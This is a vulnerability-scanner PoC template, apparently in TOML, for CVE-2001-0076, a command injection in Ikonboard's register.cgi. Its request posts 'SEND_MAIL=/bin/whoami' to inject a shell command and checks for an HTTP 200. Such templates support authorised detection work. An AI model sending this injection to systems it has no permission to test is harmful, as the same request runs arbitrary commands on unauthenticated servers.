[info]
author = "ave"
description = "Ikonboard 2.1.7b 及更早版本的 register.cgi 存在命令注入漏洞，攻击者可通过 SEND_MAIL 参数覆盖内部程序变量，从而执行任意系统命令。该漏洞无需身份认证即可远程利用，影响 Ikonboard 2.1.7b 及之前所有版本，CVSS 评分 10，危害等级严重。"
id = "POC-AVE-2001-0706"
name = "CVE-2001-0076 PoC"
severity = "critical"
tags = ["ave-2001-0706"]
vuln_id = [
    "CVE-2001-0076",
    "AVE-2001-0706",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/cgi-bin/register.cgi"
protocol = "http"

[poc.requests.body]
content = "SEND_MAIL=/bin/whoami"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
